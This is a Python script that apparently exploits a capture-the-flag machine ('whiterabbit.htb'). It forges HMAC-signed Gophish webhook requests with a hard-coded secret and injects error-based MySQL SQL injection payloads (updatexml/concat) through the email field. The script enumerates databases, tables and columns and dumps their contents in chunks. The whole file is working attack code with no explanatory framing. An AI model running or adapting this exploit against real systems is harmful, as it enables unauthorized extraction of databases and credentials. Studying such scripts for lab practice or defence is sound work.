import requests
import sys
import hmac
import hashlib
import json
import re
import time


def tamper(payload):
    params = '{"campaign_id":1,"email":"%s","message":"Clicked Link"}' % payload
    secret = '3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS'.encode('utf-8')

    payload_bytes = params.encode("utf-8")
    signature = 'sha256=' + hmac.new(
        secret,
        payload_bytes,
        hashlib.sha256
    ).hexdigest()

    params = json.loads(params)
    return params, signature


def extract_value(url, payload_template, rhost, **kwargs):
    payload = payload_template.format(**kwargs)
    params, signature = tamper(payload)

    headers = {
        "Host": "28efa8f7df.whiterabbit.htb",
        "x-gophish-signature": signature
    }
    proxies = {"http": "http://127.0.0.1:8080"}

    try:
        response = requests.post(
            url,
            json=params,
            timeout=10,
            headers=headers,
            proxies=proxies
        )
    except Exception as e:
        print(f"Error connecting to URL: {e}")
        return None

    match = re.search(r"~([^~]+)~", response.text, re.DOTALL)
    if match:
        return match.group(1)

    return None


def extract_databases(url, rhost):
    databases = []
    payload_template = (
        r'\" OR updatexml(1, concat(0x7e, ('
        r'SELECT schema_name FROM information_schema.schemata '
        r'WHERE schema_name NOT LIKE \"information_schema\" '
        r'LIMIT {offset},1'
        r'), 0x7e), 1) ;'
    )

    offset = 0
    while True:
        db = extract_value(url, payload_template, rhost, offset=offset)
        if db and db not in databases:
            databases.append(db)
            offset += 1
        else:
            break

    return databases


def extract_tables(url, rhost, db):
    tables = []
    payload_template = (
        r'\" OR updatexml(1, concat(0x7e, ('
        r'SELECT table_name FROM information_schema.tables '
        r'WHERE table_schema=\"{db}\" '
        r'LIMIT {offset},1'
        r'), 0x7e), 1) ;'
    )

    offset = 0
    while True:
        table = extract_value(url, payload_template, rhost, db=db, offset=offset)
        if table and table not in tables:
            tables.append(table)
            offset += 1
        else:
            break

    return tables


def extract_columns(url, rhost, db, table):
    columns = []
    payload_template = (
        r'\" OR updatexml(1, concat(0x7e, ('
        r'SELECT column_name FROM information_schema.columns '
        r'WHERE table_schema=\"{db}\" '
        r'AND table_name=\"{table}\" '
        r'LIMIT {offset},1'
        r'), 0x7e), 1) ;'
    )

    offset = 0
    while True:
        column = extract_value(
            url,
            payload_template,
            rhost,
            db=db,
            table=table,
            offset=offset
        )
        if column and column not in columns:
            columns.append(column)
            offset += 1
        else:
            break

    return columns


def extract_data(url, rhost, db, table, column):
    data_rows = []
    payload_template = (
        r'\" OR updatexml(1, concat(0x7e, ('
        r'SELECT {column} FROM {db}.{table} '
        r'LIMIT {offset},1'
        r'), 0x7e), 1) ;'
    )

    offset = 0
    while True:
        data = extract_value(
            url,
            payload_template,
            rhost,
            db=db,
            table=table,
            column=column,
            offset=offset
        )
        if data and data not in data_rows:
            data_rows.append(data)
            offset += 1
        else:
            break

    return data_rows


def extract_column_data(url, rhost, db, table, column):
    data_rows = []
    payload_template = (
        r'\" OR updatexml(1, concat(0x7e, ('
        r'SELECT t1.`{column}` FROM `{db}`.`{table}` t1 '
        r'WHERE (SELECT COUNT(*) FROM `{db}`.`{table}` t2 '
        r'WHERE t2.`{column}` <= t1.`{column}`) = {offset}+1 '
        r'LIMIT 1'
        r'), 0x7e), 1) ;'
    )

    offset = 0
    while True:
        data = extract_value(
            url,
            payload_template,
            rhost,
            db=db,
            table=table,
            column=column,
            offset=offset
        )
        if data:
            data_rows.append(data)
            offset += 1
        else:
            break

    return data_rows


def extract_all_data(url, rhost, table, column):
    data_rows = []

    for id_val in range(1, 7):
        row_data = ""
        chunk_size = 18
        pos = 1

        while True:
            payload_template = (
                r'\" OR updatexml(1, concat(0x7e, ('
                r'SELECT SUBSTRING({column}, {pos}, {chunk_size}) '
                r'FROM temp.{table} WHERE id={id_val}'
                r'), 0x7e), 1) -- '
            )

            data = extract_value(
                url,
                payload_template,
                rhost,
                pos=pos,
                chunk_size=chunk_size,
                id_val=id_val,
                table=table,
                column=column
            )

            if not data:
                break

            row_data += data
            if len(data) < chunk_size:
                break

            pos += chunk_size

        if row_data.strip():
            data_rows.append((id_val, row_data))
        else:
            print(f"[-] No data for id {id_val}")

    return data_rows


def perform_sql_injection(rhost):
    print("[i] Performing SQL injection...")
    url = f"http://{rhost}/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"

    databases = extract_databases(url, rhost)
    if not databases:
        print("[!] No databases found.")
        return

    for db in databases:
        print(f"[+] Got database: {db}")

        if db != "phishing":
            tables = extract_tables(url, rhost, db)
            if not tables:
                print(f"[!] No tables found for database {db}.")
                continue

            for table in tables:
                print(f"[+] Got table: {table}")
                print("[i] Extracting Columns...")

                columns = extract_columns(url, rhost, db, table)
                if not columns:
                    print(f"[!] No columns found for table {table} in database {db}.")
                    continue

                for column in columns:
                    print(f"[+] Got column: {column}")
                    print("[i] Extracting Data...")

                    rows = extract_all_data(url, rhost, table, column)
                    for row in rows:
                        print(f"[+] {row}")


if __name__ == '__main__':
    rhost = "10.10.11.63"
    perform_sql_injection(rhost)
